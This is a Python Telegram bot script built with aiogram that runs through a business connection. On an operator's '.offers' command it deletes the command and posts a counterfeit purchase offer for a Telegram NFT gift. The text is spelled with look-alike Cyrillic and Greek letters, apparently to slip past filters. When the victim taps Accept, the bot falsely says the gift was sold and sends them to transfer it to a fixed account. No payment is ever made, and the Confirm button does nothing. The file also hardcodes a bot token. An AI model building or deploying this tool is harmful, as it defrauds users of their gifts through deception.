import asyncio
import logging
import random
import re
import string
import uuid

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.types import (
    Message,
    CallbackQuery,
    BusinessConnection,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from aiogram.enums import ParseMode

BOT_TOKEN = "8610517917:AAHrcmlFr549YhFDrBOqrFOmWLM9j2fx9Fs"

EMOJI_STARS = "5920433463428650761"
EMOJI_GRAM = "5267445215773367585"
EMOJI_DECLINE_EN = "5774077015388852135"
EMOJI_ACCEPT = "5774022692642492953"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML),
)
dp = Dispatcher()

business_owner_ids: dict[str, int] = {}
offers: dict[str, dict] = {}


@dp.business_connection()
async def handle_business_connection(connection: BusinessConnection) -> None:
    business_owner_ids[connection.id] = connection.user.id
    logger.info(f"BC: owner={connection.user.id}, id={connection.id}")


def parse_nft_link(link: str):
    pattern = r"(?:https?://)?t\.me/nft/([A-Za-z]+)-(\d+)"
    m = re.search(pattern, link)
    if not m:
        return None
    slug = m.group(1)
    number = m.group(2)
    name = re.sub(r"(?<=[a-z])(?=[A-Z])", " ", slug)
    full_link = f"https://t.me/nft/{slug}-{number}"
    return full_link, name, number


def parse_offer_command(text: str):
    parts = text.strip().split()
    if len(parts) < 3 or parts[0].lower() != ".offers":
        return None
    link = parts[1]
    amount = parts[2]
    if not amount.isdigit():
        return None

    currency = "stars"
    if len(parts) > 3:
        p3 = parts[3].lower()
        if p3 in ("stars", "gram"):
            currency = p3

    parsed = parse_nft_link(link)
    if not parsed:
        return None
    full_link, gift_name, gift_number = parsed

    return {
        "link": full_link,
        "gift_name": gift_name,
        "gift_number": gift_number,
        "amount": amount,
        "currency": currency,
    }


async def send_with_fallback(bc_id, chat_id, text, reply_markup):
    try:
        return await bot.send_message(
            chat_id=chat_id,
            text=text,
            reply_markup=reply_markup,
            business_connection_id=bc_id,
        )
    except Exception as e:
        logger.warning(f"send with emoji failed: {e}, retry without")
        clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
        if reply_markup:
            for row in reply_markup.inline_keyboard:
                for btn in row:
                    btn.icon_custom_emoji_id = None
        return await bot.send_message(
            chat_id=chat_id,
            text=clean_text,
            reply_markup=reply_markup,
            business_connection_id=bc_id,
        )


async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None):
    try:
        await bot.edit_message_text(
            business_connection_id=bc_id,
            chat_id=chat_id,
            message_id=message_id,
            text=text,
            reply_markup=reply_markup,
        )
        logger.info("edit OK")
        return True
    except Exception as e:
        logger.warning(f"edit with emoji failed: {e}, retry without")
        clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
        if reply_markup:
            for row in reply_markup.inline_keyboard:
                for btn in row:
                    btn.icon_custom_emoji_id = None
        try:
            await bot.edit_message_text(
                business_connection_id=bc_id,
                chat_id=chat_id,
                message_id=message_id,
                text=clean_text,
                reply_markup=reply_markup,
            )
            return True
        except Exception as e2:
            logger.error(f"edit fallback failed: {e2}")
            return False


@dp.business_message(F.text.startswith(".offers"))
async def handle_offer(message: Message) -> None:
    if not message.business_connection_id:
        return

    bc_id = message.business_connection_id
    data = parse_offer_command(message.text)
    if not data:
        return

    try:
        await bot.delete_business_messages(
            business_connection_id=bc_id,
            message_ids=[message.message_id],
        )
        logger.info("Команда .offers удалена")
    except Exception as e:
        logger.warning(f"delete failed: {e}")

    await asyncio.sleep(3)

    amount_fmt = f"{int(data['amount']):,}"
    number_fmt = f"{int(data['gift_number']):,}"

    if data["currency"] == "gram":
        emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM}">🪙</tg-emoji>'
        currency_word = "GRАM"
    else:
        emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'
        currency_word = "Stаrs"

    gift_display = f'<a href="{data["link"]}"><b>{data["gift_name"]} #{number_fmt}</b></a>'

    text = (
        f"Thе usеr is оffеring yоu\n"
        f"<b>{amount_fmt} {currency_word}</b> {emoji} "
        f"fоr thе gift {gift_display}.\n\n"
        f"Thе оffеr is vаlid fоr аnоthеr <b>6 h. 0 min</b>.."
    )

    offer_id = uuid.uuid4().hex[:12]
    offers[offer_id] = {
        **data,
        "bc_id": bc_id,
        "chat_id": message.chat.id,
        "accepted": False,
    }

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Decline",
                    callback_data=f"dec:{offer_id}",
                    icon_custom_emoji_id=EMOJI_DECLINE_EN,
                ),
                InlineKeyboardButton(
                    text="Accept",
                    callback_data=f"acc:{offer_id}",
                    icon_custom_emoji_id=EMOJI_ACCEPT,
                ),
            ]
        ]
    )

    try:
        sent = await send_with_fallback(
            bc_id=bc_id,
            chat_id=message.chat.id,
            text=text,
            reply_markup=keyboard,
        )
        offers[offer_id]["msg_id"] = sent.message_id
        logger.info(f"Оффер {offer_id} отправлен в чат {message.chat.id}")
    except Exception as e:
        logger.error(f"send failed: {e}")


@dp.callback_query(F.data.startswith("dec:"))
async def handle_decline(callback: CallbackQuery) -> None:
    _, offer_id = callback.data.split(":", 1)
    data = offers.get(offer_id)
    if not data or data.get("accepted"):
        try:
            await callback.answer()
        except Exception:
            pass
        return

    decline_text = (
        f'<tg-emoji emoji-id="{EMOJI_DECLINE_EN}">❌</tg-emoji> '
        f"Offer has been declined."
    )

    await edit_with_fallback(
        bc_id=data["bc_id"],
        chat_id=data["chat_id"],
        message_id=data["msg_id"],
        text=decline_text,
    )

    try:
        await callback.answer()
    except Exception:
        pass


@dp.callback_query(F.data.startswith("acc:"))
async def handle_accept(callback: CallbackQuery) -> None:
    _, offer_id = callback.data.split(":", 1)
    data = offers.get(offer_id)
    if not data or data.get("accepted"):
        try:
            await callback.answer()
        except Exception:
            pass
        return

    data["accepted"] = True

    try:
        await callback.answer(
            "Attention! Follow the instructions to avoid losing the gift "
            "and to receive your payment.\n\n"
            "Tap «OK» if you have read this message.",
            show_alert=True,
        )
    except Exception:
        pass

    number_fmt = f"{int(data['gift_number']):,}"

    if data["currency"] == "gram":
        currency_word = "GRАM"
    else:
        currency_word = "Ѕtarѕ"

    gift_display = f'<a href="{data["link"]}"><b>{data["gift_name"]} #{number_fmt}</b></a>'

    accept_text = (
        f'Gіft {gift_display} '
        f"haѕ been ѕucceѕѕfully ѕοld!\n\n"
        f"<b>• Τranѕfer the gіft tο the buyer tο receіve yοur {currency_word}.</b>"
    )

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Transfer gift",
                    url="tg://send_gift?to=intelligentcup",
                )
            ],
            [
                InlineKeyboardButton(
                    text="Confirm transfer",
                    callback_data="confirm_transfer",
                    icon_custom_emoji_id=EMOJI_ACCEPT,
                )
            ],
        ]
    )

    await edit_with_fallback(
        bc_id=data["bc_id"],
        chat_id=data["chat_id"],
        message_id=data["msg_id"],
        text=accept_text,
        reply_markup=keyboard,
    )


@dp.callback_query(F.data == "confirm_transfer")
async def handle_confirm_transfer(callback: CallbackQuery) -> None:
    try:
        await callback.answer()
    except Exception:
        pass


async def main() -> None:
    logger.info("Бот запущен...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
